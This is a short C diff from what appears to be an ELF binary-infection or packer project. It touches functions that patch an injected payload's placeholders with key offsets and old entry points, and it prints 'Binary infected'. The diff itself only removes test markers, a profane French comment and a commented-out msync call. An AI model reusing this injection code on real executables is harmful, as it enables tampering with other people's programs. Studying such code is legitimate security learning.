@@ -2,7 +2,6 @@
 
 void patcher(unsigned char *ptr_injection, Elf64_Addr old_entry, t_elf_data *elf_data)
 {
-    /* TEST */
     for (size_t i = 0; i <= elf_data->g_payload_size - sizeof(uint64_t); i++) 
     {
         uint64_t *ptr = (uint64_t *)(ptr_injection + i);
@@ -33,7 +32,6 @@ void patcher(unsigned char *ptr_injection, Elf64_Addr old_entry, t_elf_data *elf
             printf("Key offset patched at offset %lu\n", i);
         }
     }
-    /* TEST */
     return;
 }
 
@@ -58,8 +56,6 @@ void injection(Elf64_Ehdr *eh, void *base, size_t size, t_elf_data *elf_data)
     ft_memcpy(ptr_injection + elf_data->g_payload_size - 16, elf_data->key, 16);
 
     patcher(ptr_injection, old_entry, elf_data);
-    /* Ptn faut changer ce truc de con */
-    //msync(base, size, MS_SYNC);
     munmap(base, size);
     printf("Binary infected\n");
 }
